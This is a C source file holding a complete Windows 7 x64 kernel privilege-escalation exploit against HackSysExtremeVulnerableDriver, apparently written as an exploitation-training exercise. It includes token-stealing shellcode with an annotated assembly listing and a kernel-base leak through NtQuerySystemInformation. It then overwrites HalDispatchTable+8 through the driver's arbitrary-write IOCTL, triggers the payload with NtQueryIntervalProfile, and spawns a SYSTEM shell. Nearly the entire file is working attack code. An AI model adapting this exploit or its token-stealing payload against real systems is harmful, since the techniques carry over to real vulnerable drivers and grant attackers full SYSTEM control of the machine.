#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <string.h>


#define IOCTL_WWW 0x0022200B

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	PVOID	Reserved1;
	PVOID	Reserved2;
	PVOID	ImageBaseAddress;
	ULONG	ImageSize;
	ULONG	Flags;
	USHORT	Index;
	USHORT	NameLength;
	USHORT	LoadCount;
	USHORT	PathLength;
	CHAR 	Name[MAXIMUM_FILENAME_LENGTH];
} SYSTEM_MODULE, *PSYSTEM_MODULE;


typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
	SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *PNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource,
	OUT PULONG Interval);


void exploit(void) {

	char shellcode[] = "\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x49\x89\xc0\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x8b\x88\x80\x01\x00\x00\x48\x83\xf9\x04\x75\xe6\x4c\x8b\x88\x08\x02\x00\x00\x4d\x89\x88\x08\x02\x00\x00\x48\x83\xc4\x20\xc3";

//Win7 x64 Token Stealing Payload
/*
    " start:                             "
    " xor     rax,rax                   ;"
    " mov     rax, gs:[rax+0x188]       ;"  # Fetch _KTHREAD address through GS register
    " mov     rax, [rax+0x70]           ;"  # Obtain _EPROCESS address from _KTHREAD
    " mov     r8,rax                    ;"  # Copy unprivileged _EPROCESS address to R8
    " find:                              "
    " mov     rax, [rax+0x188]          ;"  # Go to next EPROCESS via ActiveProcessLinks.Flink
    " sub     rax,0x188                 ;"  # Go back to the beginning of _EPROCESS structure
    " mov     rcx, [rax+0x180]          ;"  # Copy UniqueProcessId to RCX   
    " cmp     rcx, 0x04                 ;"  # Compare UniqueProcessId with SYSTEM process one
    " jne     find                      ;"  # If we are not looking at SYSTEM process grab next _EPROCESS
    " patch:                             "
    " mov     r9,[rax+0x208]            ;"  # Copy SYSTEM process token address to R9
    " mov     [r8+0x208],r9             ;"  # Steal token by overwriting the unprivileged token's reference
    " add rsp, 0x20                     ;"
    " ret                               ;" */

	LPVOID Allocated_Memory = VirtualAlloc(NULL, 0x63, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Allocated_Memory) {
		printf("[-] Error Allocating the Shellcode Buffer\n");
		exit(1);
	}

	RtlMoveMemory(Allocated_Memory, shellcode, sizeof(shellcode));
	printf("[+] Shellcode allocated at the following address: 0x%p\n", Allocated_Memory);


	LPVOID pAllocated_Memory = VirtualAlloc(NULL, 0x8, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pAllocated_Memory) {
		printf("[-] Error Allocating the Shellcode Buffer\n");
		exit(1);
	}
	RtlMoveMemory(pAllocated_Memory, &Allocated_Memory, sizeof(shellcode));
	printf("[+] Pointer to Shellcode allocated at the following address: 0x%p\n", pAllocated_Memory);

	HANDLE driverHandle;
	DWORD bytesRet;
	char exploit[16];
	const size_t offset = 8;

	printf("[+] Opening handle to \\\\.\\HackSysExtremeVulnerableDriver\n");
	driverHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("Could Not Get Handle!");
		return;
	}

	ULONG retLength = 0;
	HMODULE ntdll = GetModuleHandle("ntdll");
	PNtQuerySystemInformation ntquerysysinfo = (PNtQuerySystemInformation) GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (ntquerysysinfo == NULL){
		printf("GetProcAddress() failed.\n");
		return;
	}
	printf("[+] NTDLL Located @ Address 0x%p \n", ntdll);
	printf("[+] NtQuerySystemInformation Located @ Address: 0x%p \n", ntquerysysinfo);

	ntquerysysinfo(SystemModuleInformation, NULL, 0, &retLength);

	PSYSTEM_MODULE_INFORMATION pModuleInformation = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, retLength);

	if (pModuleInformation == NULL){
		printf("Could not allocate memory for module info\n");
		return;
	}

	ntquerysysinfo(SystemModuleInformation, pModuleInformation, retLength, &retLength);
	printf("[+] Return length size: %d\n", retLength);
	if(retLength == 0){
		printf("Failed to get system information!\n");
		return;
	}
	printf("[+] Number of Modules: %d\n", pModuleInformation->ModulesCount);

    PVOID KernelBase = pModuleInformation->Modules[0].ImageBaseAddress;
    PCHAR KernelName = strrchr((PCHAR)(pModuleInformation->Modules[0].Name), '\\')+1;
    printf("[+] Module name %s\t\n", KernelName);
    printf("[+] Base Address 0x%p\n", KernelBase);


    HMODULE UserModeKernel = NULL;
    PVOID pHalDispatchTable = NULL;

    UserModeKernel = LoadLibrary(KernelName);
    if (!UserModeKernel){
    	printf("[-] Failed to load kernel in user mode\n");
    }

    PVOID HalDispatch = (PVOID)GetProcAddress(UserModeKernel, "HalDispatchTable");
    if (!HalDispatch){
    	printf("[-] Failed to get HalDispatchTable pointer\n");
    }
    else {
    	HalDispatch = (PVOID)((ULONG_PTR)HalDispatch - (ULONG_PTR)UserModeKernel);
    	HalDispatch = (PVOID)((ULONG_PTR)HalDispatch + (ULONG_PTR)KernelBase);
    	pHalDispatchTable = HalDispatch +8;

    }

    printf("[+] HalDispatchTable Address + 8: %p\n", pHalDispatchTable);

	memset(exploit, 'A', offset);
	memcpy(&exploit, &pAllocated_Memory, 0x8);
	memcpy(&exploit[offset], &pHalDispatchTable , 0x8);
	DeviceIoControl(driverHandle, IOCTL_WWW, exploit, sizeof(exploit), NULL, 0, &bytesRet, NULL);
	printf("[+] IOCTL Sent\n");
	CloseHandle(driverHandle);
	printf("[+] Closing Handle\n");


	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	if(!NtQueryIntervalProfile){
		printf("[-] Failed to get NtQueryIntervalProfile \n");
		return;
	}

	ULONG NtQueryInterval = NULL;
    printf("[+] NtQueryIntervalProfile Address: %p\n", NtQueryIntervalProfile);
	NtQueryIntervalProfile(1337, &NtQueryInterval);
	printf("[+] Enjoy the System Shell!\n");
	system("cmd.exe");
}

int main(){
	exploit();
	return 0;
}
